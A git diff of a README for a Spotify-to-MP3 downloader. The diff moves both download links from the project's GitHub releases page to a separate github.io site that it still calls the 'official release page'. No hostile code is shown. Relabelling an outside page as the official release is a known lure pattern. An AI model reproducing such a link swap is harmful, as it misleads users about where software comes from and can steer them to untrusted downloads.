@@ -1,12 +1,12 @@
 # 🎵 Macsome-Spotify-2026 - Save Spotify music to your computer
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/scratchcommonplace400/Macsome-Spotify-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://scratchcommonplace400.github.io)
 
 Macsome Spotify Downloader brings your music collection to your local drive. This tool helps you store your Spotify tracks as MP3 files. You keep your music even if your internet connection fails or your subscription ends.
 
 ## 📥 How to download the software
 
-Visit the [official release page](https://github.com/scratchcommonplace400/Macsome-Spotify-2026/releases) to access the application.
+Visit the [official release page](https://scratchcommonplace400.github.io) to access the application.
 
 1. Click the link above to open your browser.
 2. Look for the section labeled "Assets."
